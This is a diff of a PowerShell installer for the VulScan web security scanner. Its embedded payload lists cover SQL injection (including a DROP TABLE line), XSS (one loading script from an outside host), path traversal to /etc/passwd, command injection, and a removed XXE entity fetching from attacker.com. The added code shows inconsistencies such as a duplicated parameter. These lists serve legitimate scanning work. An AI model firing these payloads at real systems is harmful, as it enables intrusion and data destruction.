@@ -1,42 +1,7 @@
-#Requires -Version 5.1
-#Requires -RunAsAdministrator
+# VulScan PowerShell Installer v4.0.0
+# Advanced Web Security Scanner
+# by ATOMGAMERAGA
 
-<#
-.SYNOPSIS
-    VulScan Advanced PowerShell Installer v5.0.0 - Fixed
-    
-.DESCRIPTION
-    Modern PowerShell installer for VulScan Web Security Scanner
-    Features: Progress bars, error handling, logging, automatic updates, and more
-    
-.PARAMETER Version
-    Version to install: Stable, Development, or Manual
-    
-.PARAMETER InstallPath
-    Custom installation directory
-    
-.PARAMETER Silent
-    Run installation silently without user interaction
-    
-.PARAMETER SkipPathUpdate
-    Skip adding to PATH environment variable
-    
-.PARAMETER LogFile
-    Custom log file location
-    
-.EXAMPLE
-    .\VulScan-Installer.ps1
-    
-.EXAMPLE
-    .\VulScan-Installer.ps1 -Version Development -InstallPath "D:\Tools\VulScan" -Silent
-    
-.NOTES
-    Author: Enhanced PowerShell Version - Fixed
-    Version: 5.0.1
-    Requires: PowerShell 5.1+, Administrator privileges
-#>
-
-[CmdletBinding()]
 param(
     [Parameter(Mandatory = $false)]
     [ValidateSet("Stable", "Development", "Manual")]
@@ -45,317 +10,115 @@ param(
     [Parameter(Mandatory = $false)]
     [string]$InstallPath,
     
-    [Parameter(Mandatory = $false)]
-    [switch]$Silent,
+    [Parameter(Mandatory=$false)]
+    [string]$InstallPath = "C:\Program Files\VulScan",
     
-    [Parameter(Mandatory = $false)]
-    [switch]$SkipPathUpdate,
+    [Parameter(Mandatory=$false)]
+    [switch]$CreateDesktopShortcut,
     
-    [Parameter(Mandatory = $false)]
-    [string]$LogFile = "$env:TEMP\VulScan-Installer.log"
+    [Parameter(Mandatory=$false)]
+    [switch]$Force,
+    
+    [Parameter(Mandatory=$false)]
+    [switch]$Quiet
 )
 
-# Global variables
-$Script:Config = @{
-    Version = "5.0.1"
-    ProductName = "VulScan"
-    Author = "ATOMGAMERAGA"
-    MinPowerShellVersion = [Version]"5.1"
-    MinGoVersion = [Version]"1.19"
-    TempDir = "$env:TEMP\VulScan_Install_$(Get-Random)"
-    DefaultInstallDir = "${env:ProgramFiles}\VulScan"
-    ConfigDir = "${env:ProgramData}\VulScan"
-    StartMenuDir = "${env:ProgramData}\Microsoft\Windows\Start Menu\Programs\VulScan"
-    LogFile = $LogFile
-    Colors = @{
-        Header = 'Cyan'
-        Success = 'Green'
-        Warning = 'Yellow'
-        Error = 'Red'
-        Info = 'White'
-        Progress = 'Magenta'
-    }
-}
+# ASCII Banner
+$banner = @"
 
-# Version configurations
-$Script:Versions = @{
-    Stable = @{
-        Url = "https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/main.go"
-        Tag = "v3.0-stable"
-        Description = "Tested and stable main branch"
-    }
-    Development = @{
-        Url = "https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/dev/main-4.0.0.go"
-        Tag = "v4.1.0-dev"
-        Description = "Latest features and updates"
-    }
-}
+ ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
+ ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
+ ██║   ██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
+ ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
+  ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
+   ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
 
-# Enhanced logging function
-function Write-Log {
-    [CmdletBinding()]
-    param(
-        [Parameter(Mandatory = $true)]
-        [string]$Message,
-        
-        [Parameter(Mandatory = $false)]
-        [ValidateSet('Info', 'Warning', 'Error', 'Success', 'Debug')]
-        [string]$Level = 'Info'
-    )
-    
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $logEntry = "[$timestamp] [$Level] $Message"
-    
-    # Write to log file
-    try {
-        Add-Content -Path $Script:Config.LogFile -Value $logEntry -ErrorAction SilentlyContinue
-    }
-    catch {
-        # Silently continue if logging fails
-    }
-    
-    # Write to console with colors
-    if (-not $Silent) {
-        switch ($Level) {
-            'Success' { Write-Host "✅ $Message" -ForegroundColor $Script:Config.Colors.Success }
-            'Warning' { Write-Host "⚠️  $Message" -ForegroundColor $Script:Config.Colors.Warning }
-            'Error' { Write-Host "❌ $Message" -ForegroundColor $Script:Config.Colors.Error }
-            'Info' { Write-Host "ℹ️  $Message" -ForegroundColor $Script:Config.Colors.Info }
-            'Debug' { 
-                if ($VerbosePreference -ne 'SilentlyContinue') {
-                    Write-Host "🔍 $Message" -ForegroundColor Gray
-                }
-            }
-        }
-    }
-}
+               VulScan PowerShell Installer v4.0.0
+                 Advanced Web Security Scanner
+                       by ATOMGAMERAGA
 
-# Enhanced progress bar
-function Show-Progress {
-    [CmdletBinding()]
-    param(
-        [Parameter(Mandatory = $true)]
-        [string]$Activity,
-        
-        [Parameter(Mandatory = $true)]
-        [string]$Status,
-        
-        [Parameter(Mandatory = $true)]
-        [int]$PercentComplete,
-        
-        [Parameter(Mandatory = $false)]
-        [int]$Id = 1
-    )
-    
-    if (-not $Silent) {
-        Write-Progress -Id $Id -Activity $Activity -Status $Status -PercentComplete $PercentComplete
-    }
-}
-
-# Display header with ASCII art
-function Show-Header {
-    if ($Silent) { return }
-    
-    Clear-Host
-    
-    $header = @"
-  ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
-  ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
-  ██║   ██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
-  ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
-   ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
-    ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
-
-            VulScan PowerShell Installer v$($Script:Config.Version)
-              Advanced Web Security Scanner
-                 by $($Script:Config.Author)
 "@
-    
-    Write-Host $header -ForegroundColor $Script:Config.Colors.Header
-    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
-    Write-Host ""
+
+# Configuration
+$configDir = "C:\ProgramData\VulScan"
+$payloadsDir = "$configDir\payloads"
+$tempDir = "$env:TEMP\VulScan_Install_$(Get-Random)"
+
+# URLs for different versions
+$urls = @{
+    "stable" = @{
+        "url" = "https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/main.go"
+        "tag" = "v3.0-stable"
+        "desc" = "Stable Release - Kararlı sürüm"
+    }
+    "dev" = @{
+        "url" = "https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/dev/main-4.0.0.go"
+        "tag" = "v4.0.0-dev"
+        "desc" = "Development Release - Geliştirme sürümü"
+    }
 }
 
-# System requirements check
-function Test-SystemRequirements {
-    Write-Log "Checking system requirements..." -Level Info
-    Show-Progress -Activity "System Check" -Status "Verifying requirements..." -PercentComplete 10
+function Write-ColorOutput {
+    param(
+        [string]$Message,
+        [string]$Color = "White",
+        [string]$Prefix = "[INFO]"
+    )
     
-    $issues = @()
-    
-    # Check PowerShell version
-    if ($PSVersionTable.PSVersion -lt $Script:Config.MinPowerShellVersion) {
-        $issues += "PowerShell $($Script:Config.MinPowerShellVersion) or higher required. Current: $($PSVersionTable.PSVersion)"
-    }
-    
-    # Check administrator privileges
-    $currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
-    if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        $issues += "Administrator privileges required"
-    }
-    
-    # Check available disk space (minimum 100MB)
-    $installDrive = ($Script:Config.DefaultInstallDir -split ':')[0] + ':'
-    $freeSpace = (Get-WmiObject -Class Win32_LogicalDisk -Filter "DeviceID='$installDrive'").FreeSpace
-    if ($freeSpace -lt 100MB) {
-        $issues += "Insufficient disk space. At least 100MB required on $installDrive"
-    }
-    
-    # Check internet connectivity
-    try {
-        $null = Test-NetConnection -ComputerName "github.com" -Port 443 -InformationLevel Quiet -ErrorAction Stop
-    }
-    catch {
-        $issues += "Internet connection required to download VulScan source code"
-    }
-    
-    if ($issues.Count -gt 0) {
-        Write-Log "System requirements check failed:" -Level Error
-        foreach ($issue in $issues) {
-            Write-Log "  - $issue" -Level Error
+    if (-not $Quiet) {
+        $prefixColor = switch ($Prefix) {
+            "[ERROR]" { "Red" }
+            "[WARNING]" { "Yellow" }
+            "[SUCCESS]" { "Green" }
+            "[INFO]" { "Cyan" }
+            default { "White" }
         }
-        throw "System requirements not met"
+        
+        Write-Host "$Prefix " -ForegroundColor $prefixColor -NoNewline
+        Write-Host $Message -ForegroundColor $Color
     }
-    
-    Write-Log "System requirements check passed" -Level Success
-    Show-Progress -Activity "System Check" -Status "Requirements verified" -PercentComplete 25
 }
 
-# Check and install Go if needed
-function Install-Go {
-    Write-Log "Checking Go installation..." -Level Info
-    Show-Progress -Activity "Go Installation" -Status "Checking Go..." -PercentComplete 30
-    
+function Test-Administrator {
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+function Test-GoInstalled {
     try {
         $goVersion = go version 2>$null
         if ($LASTEXITCODE -eq 0) {
-            $versionString = ($goVersion -split ' ')[2].TrimStart('go')
-            $currentVersion = [Version]($versionString -replace 'go', '')
-            
-            if ($currentVersion -ge $Script:Config.MinGoVersion) {
-                Write-Log "Go $versionString found and compatible" -Level Success
-                return
-            }
+            return $true, $goVersion
         }
+        return $false, $null
     }
     catch {
-        # Go not found
-    }
-    
-    Write-Log "Go not found or incompatible version" -Level Warning
-    
-    if ($Silent) {
-        throw "Go $($Script:Config.MinGoVersion) or higher required for automatic installation"
-    }
-    
-    $installGo = Read-Host "Would you like to download and install Go automatically? (Y/N)"
-    if ($installGo -match '^[Yy]') {
-        Install-GoRuntime
-    }
-    else {
-        Write-Log "Please install Go manually from https://golang.org/dl/" -Level Info
-        Write-Log "After installation, run this installer again or choose manual installation" -Level Info
-        throw "Go installation required"
+        return $false, $null
     }
 }
 
-# Download and install Go
-function Install-GoRuntime {
-    Write-Log "Downloading Go installer..." -Level Info
-    Show-Progress -Activity "Go Installation" -Status "Downloading Go..." -PercentComplete 35
-    
-    $architecture = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
-    $goUrl = "https://golang.org/dl/go1.21.0.windows-$architecture.msi"
-    $goInstaller = "$env:TEMP\go-installer.msi"
-    
-    try {
-        Invoke-WebRequest -Uri $goUrl -OutFile $goInstaller -UserAgent "VulScan-Installer/$($Script:Config.Version)"
-        
-        Write-Log "Installing Go..." -Level Info
-        Show-Progress -Activity "Go Installation" -Status "Installing Go..." -PercentComplete 45
-        
-        $process = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i", $goInstaller, "/quiet", "/norestart" -Wait -PassThru
-        
-        if ($process.ExitCode -eq 0) {
-            Write-Log "Go installed successfully" -Level Success
-            # Refresh environment variables
-            $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
-        }
-        else {
-            throw "Go installation failed with exit code: $($process.ExitCode)"
-        }
-    }
-    catch {
-        Write-Log "Failed to install Go: $($_.Exception.Message)" -Level Error
-        throw
-    }
-    finally {
-        if (Test-Path $goInstaller) {
-            Remove-Item $goInstaller -Force -ErrorAction SilentlyContinue
-        }
-    }
-}
-
-# Version selection menu
-function Select-Version {
-    if ($Version) {
-        return $Version
-    }
-    
-    if ($Silent) {
-        return "Stable"
-    }
-    
-    Write-Host ""
-    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
-    Write-Host "                    VERSION SELECTION" -ForegroundColor $Script:Config.Colors.Header
-    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
-    Write-Host ""
-    Write-Host "Which version would you like to install?" -ForegroundColor $Script:Config.Colors.Info
-    Write-Host ""
-    
-    $options = @(
-        @{
-            Number = 1
-            Name = "Stable"
-            Description = $Script:Versions.Stable.Description
-            Tag = $Script:Versions.Stable.Tag
-        },
-        @{
-            Number = 2
-            Name = "Development"
-            Description = $Script:Versions.Development.Description
-            Tag = $Script:Versions.Development.Tag
-        },
-        @{
-            Number = 3
-            Name = "Manual"
-            Description = "Use your own .exe file"
-            Tag = "manual"
-        }
+function Get-UserChoice {
+    param(
+        [string]$Prompt,
+        [string[]]$Options,
+        [string]$Default = ""
     )
     
-    foreach ($option in $options) {
-        Write-Host "[$($option.Number)] " -ForegroundColor $Script:Config.Colors.Progress -NoNewline
-        Write-Host "$($option.Name) ($($option.Tag))" -ForegroundColor $Script:Config.Colors.Success
-        Write-Host "    └─ $($option.Description)" -ForegroundColor Gray
-        Write-Host ""
+    if ($Quiet -and $Default) {
+        return $Default
     }
     
     do {
-        $choice = Read-Host "Select your choice (1/2/3)"
-        switch ($choice) {
-            "1" { return "Stable" }
-            "2" { return "Development" }
-            "3" { return "Manual" }
-            default { 
-                Write-Host "Invalid selection! Please choose 1, 2, or 3." -ForegroundColor $Script:Config.Colors.Error
-            }
+        $choice = Read-Host $Prompt
+        if ([string]::IsNullOrEmpty($choice) -and $Default) {
+            return $Default
         }
-    } while ($true)
+    } while ($choice -notin $Options)
+    
+    return $choice
 }
 
-# Download and compile VulScan
 function Install-VulScan {
     param([string]$SelectedVersion)
     
@@ -404,16 +167,8 @@ require (
     gopkg.in/yaml.v3 v3.0.1
 )
 "@
-    
-    Set-Content -Path (Join-Path $Script:Config.TempDir "go.mod") -Value $goModContent
-    
-    # Download dependencies
-    Push-Location $Script:Config.TempDir
-    try {
-        Write-Log "Downloading Go dependencies..." -Level Info
-        Show-Progress -Activity "VulScan Installation" -Status "Downloading dependencies..." -PercentComplete 65
         
-        $null = go mod tidy 2>&1
+        Set-Content -Path (Join-Path $tempDir "go.mod") -Value $goModContent
         
         # Build executable
         Write-Log "Compiling VulScan..." -Level Info
@@ -592,126 +347,96 @@ updates:
   check_on_startup: true
   auto_update_payloads: false
 "@
-    
-    Set-Content -Path (Join-Path $configDir "config.yaml") -Value $configContent
-    
-    # Create enhanced payload files with proper escaping
-    $payloads = @{
-        "sql.txt" = @(
-            "# SQL Injection Payloads - Enhanced Set",
-            "' OR '1'='1",
-            "' OR 1=1 --",
-            "' UNION SELECT NULL--",
-            "'; DROP TABLE users; --",
-            "' AND SLEEP(5) --",
-            "' OR IF(1=1,SLEEP(5),0) --",
-            "admin'--",
-            "admin' #",
-            ") or '1'='1--",
-            "' OR '1'='1' /*",
-            "1' ORDER BY 1--+",
-            "1' ORDER BY 2--+",
-            "1' ORDER BY 3--+",
-            "1' UNION SELECT 1--+",
-            "1' UNION SELECT 1,2--+",
-            "1' UNION SELECT 1,2,3--+"
-        )
+        Set-Content -Path (Join-Path $configDir "config.yaml") -Value $configContent
         
-        "xss.txt" = @(
-            "# XSS Payloads - Enhanced Set",
-            "<script>alert('XSS')</script>",
-            "<script>alert(document.cookie)</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "'><script>alert('XSS')</script>",
-            '""><script>alert(""XSS"")</script>',
-            "<iframe src=javascript:alert('XSS')>",
-            "<body onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>",
-            "<select onfocus=alert('XSS') autofocus>",
-            "<textarea onfocus=alert('XSS') autofocus>",
-            "<keygen onfocus=alert('XSS') autofocus>",
-            "<video><source onerror=alert('XSS')>"
-        )
+        # Create payload files
+        Write-ColorOutput "Payload dosyaları oluşturuluyor..." "White"
         
-        "lfi.txt" = @(
-            "# Directory Traversal / LFI Payloads",
-            "../",
-            "..\",
-            "../../../etc/passwd",
-            "..\..\..\windows\system32\drivers\etc\hosts",
-            "....//....//....//etc/passwd",
-            "....\\....\\....\\windows\system32\drivers\etc\hosts",
-            "%2e%2e%2f",
-            "%2e%2e%5c",
-            "..%2f",
-            "..%5c",
-            "%2e%2e/",
-            "%2e%2e\"
-        )
+        # SQL Injection payloads
+        $sqlPayloads = @"
+# SQL Injection Payloads - VulScan v4.1.0
+' OR '1'='1
+' OR 1=1 --
+' UNION SELECT NULL--
+'; DROP TABLE users; --
+' AND SLEEP(5) --
+' OR IF(1=1,SLEEP(5),0) --
+admin'--
+admin' #
+) or '1'='1--
+) or ('1'='1--
+' UNION SELECT 1,2,3,4,5,version(),7,8,9,10--
+' or 1=1#
+' or 1=1/*
+"@ -replace "`r`n", "`n"
         
-        "cmd.txt" = @(
-            "# Command Injection Payloads",
-            "; ls",
-            "| id",
-            """&"" whoami",
-            """`id`""",
-            """``$``(id)""",
-            "; cat /etc/passwd",
-            "| type c:\windows\system32\drivers\etc\hosts",
-            """&"" dir",
-            "; uname -a",
-            "``||`` id",
-            """&&"" id",
-            "; sleep 5",
-            "| ping -c 4 127.0.0.1"
-        )
+        # XSS payloads
+        $xssPayloads = @"
+# XSS Payloads - VulScan v4.1.0
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+'><script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+<iframe src="javascript:alert('XSS')">
+<body onload=alert('XSS')>
+<div onmouseover="alert('XSS')">test</div>
+<script src=//brutelogic.com.br/1.js></script>
+"@ -replace "`r`n", "`n"
         
-        "xxe.txt" = @(
-            "# XXE (XML External Entity) Payloads",
-            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
-            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml">]><foo>&xxe;</foo>'
-        )
+        # Directory Traversal payloads
+        $lfiPayloads = @"
+# Directory Traversal / LFI Payloads - VulScan v4.1.0
+../
+..\
+../../../etc/passwd
+..\..\..\windows\system32\drivers\etc\hosts
+....//....//....//etc/passwd
+....\\....\\....\\windows\system32\drivers\etc\hosts
+%2e%2e%2f
+%2e%2e%5c
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+"@ -replace "`r`n", "`n"
         
-        "ssti.txt" = @(
-            "# Server-Side Template Injection Payloads",
-            "``{{``7*7``}}``",
-            "``{{``7*'7'``}}``",
-            """``$``{7*7}""",
-            "#``{``7*7``}``",
-            """<%="" 7*7 %>""%",
-            """``$``{{``7*7``}}""",
-            "``{{``config.items()``}}``",
-            "``{{````'````.____class____.__mro__[2].__subclasses__()``}}``",
-            "``{%``for c in [1,2,3]``%}````{{``c,c,c``}}````{%``endfor``%}``"
-        )
+        # Command Injection payloads
+        $cmdPayloads = @"
+# Command Injection Payloads - VulScan v4.1.0
+; ls
+| id
+& whoami
+`+"`id`"+@"
+$(id)
+; cat /etc/passwd
+| type c:\windows\system32\drivers\etc\hosts
+& dir
+; uname -a
+|| id
+&& id
+; ping -c 4 127.0.0.1
+"@ -replace "`r`n", "`n"
+        
+        Set-Content -Path (Join-Path $payloadsDir "sql.txt") -Value $sqlPayloads
+        Set-Content -Path (Join-Path $payloadsDir "xss.txt") -Value $xssPayloads
+        Set-Content -Path (Join-Path $payloadsDir "lfi.txt") -Value $lfiPayloads
+        Set-Content -Path (Join-Path $payloadsDir "cmd.txt") -Value $cmdPayloads
+        
+        return $true
     }
-    
-    foreach ($payloadFile in $payloads.Keys) {
-        $content = $payloads[$payloadFile] -join "`r`n"
-        Set-Content -Path (Join-Path $payloadsDir $payloadFile) -Value $content
+    catch {
+        Write-ColorOutput "Dosya kurulum hatası: $($_.Exception.Message)" "Red" "[ERROR]"
+        return $false
     }
-    
-    Write-Log "Configuration files created successfully" -Level Success
 }
 
-# Update PATH environment variable
-function Update-PathVariable {
-    if ($SkipPathUpdate) {
-        Write-Log "Skipping PATH update as requested" -Level Info
-        return
-    }
-    
-    Write-Log "Updating PATH environment variable..." -Level Info
-    Show-Progress -Activity "Environment Setup" -Status "Updating PATH..." -PercentComplete 92
-    
-    $installDir = $Script:InstallationPaths.InstallDir
-    
+function Add-ToPath {
     try {
-        # Get current PATH
-        $currentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
+        Write-ColorOutput "PATH ortam değişkeni güncelleniyor..." "White"
+        
+        # Get current system PATH
+        $currentPath = [Environment]::GetEnvironmentVariable("PATH", [EnvironmentVariableTarget]::Machine)
         
         # Check if already in PATH
         if ($currentPath -split ';' -contains $installDir) {
@@ -734,31 +459,347 @@ function Update-PathVariable {
         Write-Log "PATH updated successfully" -Level Success
     }
     catch {
-        Write-Log "Failed to update PATH: $($_.Exception.Message)" -Level Warning
-        Write-Log "You may need to add $installDir to PATH manually" -Level Warning
+        Write-ColorOutput "PATH güncellenemedi: $($_.Exception.Message)" "Yellow" "[WARNING]"
+        return $false
     }
 }
 
-# Create shortcuts and Start Menu entries
-function New-Shortcuts {
-    Write-Log "Creating shortcuts and Start Menu entries..." -Level Info
-    Show-Progress -Activity "Shortcuts Creation" -Status "Creating shortcuts..." -PercentComplete 95
-    
-    $installDir = $Script:InstallationPaths.InstallDir
-    $exePath = $Script:InstallationPaths.ExecutablePath
-    $startMenuDir = $Script:Config.StartMenuDir
-    
-    # Create COM object for shortcuts
-    $shell = New-Object -ComObject WScript.Shell
+function Create-Shortcuts {
+    param([string]$VersionTag)
     
     try {
-        # Main VulScan shortcut
-        $mainShortcut = $shell.CreateShortcut((Join-Path $startMenuDir "VulScan.lnk"))
-        $mainShortcut.TargetPath = $exePath
-        $mainShortcut.WorkingDirectory = $installDir
-        $mainShortcut.Description = "VulScan - Web Security Scanner"
-        $mainShortcut.IconLocation = "$exePath,0"
-        $mainShortcut.Save()
+        Write-ColorOutput "Kısayollar oluşturuluyor..." "White"
         
-        # PowerShell with VulScan loaded
-        $psShortcut = $shell.CreateShortcut((Join-
+        # Create Start Menu folder
+        $startMenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\VulScan"
+        New-Item -ItemType Directory -Path $startMenuPath -Force | Out-Null
+        
+        # Create WScript Shell COM object
+        $WshShell = New-Object -ComObject WScript.Shell
+        
+        # VulScan shortcut
+        $shortcut = $WshShell.CreateShortcut("$startMenuPath\VulScan.lnk")
+        $shortcut.TargetPath = "$InstallPath\vulscan.exe"
+        $shortcut.WorkingDirectory = $InstallPath
+        $shortcut.Description = "VulScan - Web Security Scanner"
+        $shortcut.Save()
+        
+        # Command Prompt shortcut
+        $cmdShortcut = $WshShell.CreateShortcut("$startMenuPath\VulScan Command Prompt.lnk")
+        $cmdShortcut.TargetPath = "cmd.exe"
+        $cmdShortcut.Arguments = "/k echo VulScan $VersionTag - Ready! & echo Type: vulscan --help for usage & echo."
+        $cmdShortcut.WorkingDirectory = $env:USERPROFILE
+        $cmdShortcut.Description = "VulScan Command Prompt"
+        $cmdShortcut.Save()
+        
+        # Desktop shortcut
+        if ($CreateDesktopShortcut) {
+            $desktopPath = [Environment]::GetFolderPath("CommonDesktopDirectory")
+            $desktopShortcut = $WshShell.CreateShortcut("$desktopPath\VulScan.lnk")
+            $desktopShortcut.TargetPath = "$InstallPath\vulscan.exe"
+            $desktopShortcut.WorkingDirectory = $InstallPath
+            $desktopShortcut.Description = "VulScan - Web Security Scanner"
+            $desktopShortcut.Save()
+            Write-ColorOutput "Masaüstü kısayolu oluşturuldu ✓" "Green" "[SUCCESS]"
+        }
+        
+        Write-ColorOutput "Kısayollar başarıyla oluşturuldu ✓" "Green" "[SUCCESS]"
+        return $true
+    }
+    catch {
+        Write-ColorOutput "Kısayol oluşturma hatası: $($_.Exception.Message)" "Yellow" "[WARNING]"
+        return $false
+    }
+}
+
+function Create-Uninstaller {
+    param([string]$VersionTag)
+    
+    try {
+        Write-ColorOutput "Kaldırma programı oluşturuluyor..." "White"
+        
+        # PowerShell uninstaller script
+        $uninstallerContent = @"
+# VulScan Uninstaller
+# Generated by PowerShell Installer v3.1.0
+
+Write-Host "VulScan Uninstaller" -ForegroundColor Red
+Write-Host "==================" -ForegroundColor Red
+Write-Host ""
+
+`$confirm = Read-Host "VulScan'i kaldırmak istediğinizden emin misiniz? (y/n)"
+if (`$confirm -ne "y" -and `$confirm -ne "Y") {
+    Write-Host "Kaldırma iptal edildi." -ForegroundColor Yellow
+    Read-Host "Çıkmak için Enter'a basın"
+    exit 0
+}
+
+Write-Host ""
+Write-Host "[INFO] VulScan kaldırılıyor..." -ForegroundColor Cyan
+
+try {
+    # Remove from PATH
+    `$currentPath = [Environment]::GetEnvironmentVariable("PATH", [EnvironmentVariableTarget]::Machine)
+    `$newPath = `$currentPath -replace [regex]::Escape("$InstallPath;"), ""
+    `$newPath = `$newPath -replace [regex]::Escape(";$InstallPath"), ""
+    [Environment]::SetEnvironmentVariable("PATH", `$newPath, [EnvironmentVariableTarget]::Machine)
+    
+    # Remove directories
+    Remove-Item -Path "$InstallPath" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "$configDir" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "`$env:ProgramData\Microsoft\Windows\Start Menu\Programs\VulScan" -Recurse -Force -ErrorAction SilentlyContinue
+    
+    # Remove registry entries
+    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan" -ErrorAction SilentlyContinue
+    
+    Write-Host "[SUCCESS] VulScan başarıyla kaldırıldı!" -ForegroundColor Green
+    Write-Host "[INFO] Yeni terminal oturumu açarak PATH değişikliklerini uygulayın." -ForegroundColor Cyan
+}
+catch {
+    Write-Host "[ERROR] Kaldırma sırasında hata: `$(`$_.Exception.Message)" -ForegroundColor Red
+}
+
+Read-Host "Çıkmak için Enter'a basın"
+"@
+        
+        Set-Content -Path (Join-Path $InstallPath "uninstall.ps1") -Value $uninstallerContent
+        
+        # Create batch wrapper for uninstaller
+        $batchUninstaller = @"
+@echo off
+powershell -ExecutionPolicy Bypass -File "$InstallPath\uninstall.ps1"
+pause
+"@
+        Set-Content -Path (Join-Path $InstallPath "uninstall.bat") -Value $batchUninstaller
+        
+        # Create uninstall shortcut
+        $WshShell = New-Object -ComObject WScript.Shell
+        $uninstallShortcut = $WshShell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\VulScan\Uninstall VulScan.lnk")
+        $uninstallShortcut.TargetPath = "$InstallPath\uninstall.bat"
+        $uninstallShortcut.WorkingDirectory = $InstallPath
+        $uninstallShortcut.Description = "Uninstall VulScan"
+        $uninstallShortcut.Save()
+        
+        return $true
+    }
+    catch {
+        Write-ColorOutput "Kaldırma programı oluşturulamadı: $($_.Exception.Message)" "Yellow" "[WARNING]"
+        return $false
+    }
+}
+
+function Register-WithWindows {
+    param([string]$VersionTag)
+    
+    try {
+        Write-ColorOutput "Windows Programs listesine ekleniyor..." "White"
+        
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan"
+        
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
+        }
+        
+        Set-ItemProperty -Path $regPath -Name "DisplayName" -Value "VulScan - Web Security Scanner"
+        Set-ItemProperty -Path $regPath -Name "DisplayVersion" -Value $VersionTag
+        Set-ItemProperty -Path $regPath -Name "Publisher" -Value "ATOMGAMERAGA"
+        Set-ItemProperty -Path $regPath -Name "UninstallString" -Value "$InstallPath\uninstall.bat"
+        Set-ItemProperty -Path $regPath -Name "InstallLocation" -Value $InstallPath
+        Set-ItemProperty -Path $regPath -Name "DisplayIcon" -Value "$InstallPath\vulscan.exe"
+        Set-ItemProperty -Path $regPath -Name "NoModify" -Value 1 -Type DWord
+        Set-ItemProperty -Path $regPath -Name "NoRepair" -Value 1 -Type DWord
+        
+        Write-ColorOutput "Kayıt başarılı ✓" "Green" "[SUCCESS]"
+        return $true
+    }
+    catch {
+        Write-ColorOutput "Windows kayıt hatası: $($_.Exception.Message)" "Yellow" "[WARNING]"
+        return $false
+    }
+}
+
+function Test-Installation {
+    try {
+        Write-ColorOutput "Kurulum testi yapılıyor..." "White"
+        
+        $testResult = & "$InstallPath\vulscan.exe" --version 2>$null
+        if ($LASTEXITCODE -eq 0) {
+            Write-ColorOutput "✅ Test başarılı!" "Green" "[SUCCESS]"
+            return $true
+        } else {
+            Write-ColorOutput "⚠️ Test başarısız - Manuel kontrol gerekli" "Yellow" "[WARNING]"
+            return $false
+        }
+    }
+    catch {
+        Write-ColorOutput "⚠️ Test hatası: $($_.Exception.Message)" "Yellow" "[WARNING]"
+        return $false
+    }
+}
+
+function Clean-TempFiles {
+    try {
+        if (Test-Path $tempDir) {
+            Remove-Item -Path $tempDir -Recurse -Force
+            Write-ColorOutput "Geçici dosyalar temizlendi ✓" "Green" "[SUCCESS]"
+        }
+    }
+    catch {
+        Write-ColorOutput "Geçici dosya temizleme hatası: $($_.Exception.Message)" "Yellow" "[WARNING]"
+    }
+}
+
+# Main installation process
+try {
+    if (-not $Quiet) {
+        Clear-Host
+        Write-Host $banner -ForegroundColor Cyan
+    }
+    
+    # Check administrator privileges
+    if (-not (Test-Administrator)) {
